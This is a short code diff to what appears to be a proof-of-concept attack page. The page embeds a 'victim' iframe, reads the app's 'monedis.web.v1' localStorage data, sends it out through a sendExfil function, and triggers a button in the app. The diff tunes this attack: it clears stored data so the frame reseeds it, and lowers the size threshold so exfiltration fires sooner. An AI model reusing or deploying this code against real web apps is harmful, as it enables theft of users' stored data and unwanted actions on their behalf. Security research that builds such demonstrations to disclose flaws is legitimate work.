@@ -319,6 +319,9 @@ body {
 </div>
 
 <script>
+// Clear stale Monedis data so the iframe always seeds fresh on load
+try { window.localStorage.removeItem('monedis.web.v1'); } catch(e) {}
+
 var iframeReady = false;
 
 document.getElementById('victim').addEventListener('load', function () {
@@ -352,7 +355,7 @@ function pollAndExfil(tries) {
   if (tries === undefined) tries = 48;
   // localStorage is same-origin: readable directly from window
   var raw = window.localStorage.getItem('monedis.web.v1') || '';
-  if (raw.length > 50) {
+  if (raw.length > 5) {
     sendExfil(raw);
     triggerAppButton();
     setTimeout(showSuccess, 900);
